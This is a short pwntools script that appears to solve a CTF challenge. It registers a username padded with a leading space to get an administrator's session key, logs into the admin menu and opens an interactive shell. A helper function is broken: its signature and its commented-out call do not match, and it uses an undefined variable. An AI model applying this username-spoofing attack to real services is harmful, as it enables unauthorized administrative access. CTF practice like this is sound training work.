from pwn import *

# Function to register a user
def register_user(p, username, password):
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Username: ", username)
    p.sendlineafter("Password: ", password)
    p.recvuntil("Your session key: ")
    session_key = p.recvline().strip().decode()
    log.success(f"Session key obtained: {session_key}")
    return session_key

# Function to login using a session key
def login_with_session(p, session_key):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Select: ", "2")
    p.sendlineafter("Session key: ", session_key)
    p.recvuntil("Administator Menu")
    log.success("Logged in as admin!")

# Function to execute a command in the admin debug menu
def execute_debug_command(command):
    p.sendline("1")  # Select Debug
    p.sendline(command)  # Send the command to evaluate
    response = p.recvline().decode().strip()
    log.info(f"Debug response: {response}")

# Main function to run the exploit
def main():
    # Start a process that runs the target program
    p = remote("challenges.ctf.compfest.id", 20010)  # Replace 'target_script.py' with the script name
    # Register the user "cf-min"
    session_key = register_user(p, " cf-min", "")

    # Login with the obtained session key
    login_with_session(p, session_key)
    # Optionally interact with the admin menu
    p.interactive()
#    execute_debug_command(p, "print('Admin access achieved!')")
    # Finish the script

if __name__ == "__main__":
    main()
